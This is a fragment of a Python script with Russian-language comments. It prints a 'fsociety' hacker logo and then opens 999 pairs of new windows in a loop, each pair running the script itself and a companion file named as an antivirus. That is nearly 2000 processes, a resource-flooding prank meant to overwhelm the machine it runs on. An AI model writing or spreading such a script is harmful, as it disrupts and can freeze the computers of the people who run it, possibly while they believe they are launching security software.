...
def main():
    # Режим работы дочернего окна fsociety
    ...
    # Проверка наличия файла антивируса
    if not os.path.exists(antivirus_path):
        print(f"[!] Ошибка: Файл '{ANTIVIRUS_SCRIPT}' не найден в директории:")
        print(f"    {base_dir}")
        print("Убедитесь, что скрипт антивируса находится в той же папке.")
        input("Нажмите Enter для выхода...")
        return

    print("Запуск главного модуля...")
    print_logo()

    current_script_path = os.path.abspath(sys.argv[0])

    print("Запуск парных окон (fsociety + padikissanti)...")
    PAIR_COUNT = 999

    for i in range(PAIR_COUNT):
        print(f"Открытие пары {i + 1} из {PAIR_COUNT}...")

        # 1. Окно с логотипом fsociety
        spawn_process_in_new_window(current_script_path, args=["--child"])

        # 2. Окно с антивирусом
        spawn_process_in_new_window(antivirus_path)

        time.sleep(0.01)

    print(f"\nУспешно открыто {PAIR_COUNT} пар окон.")
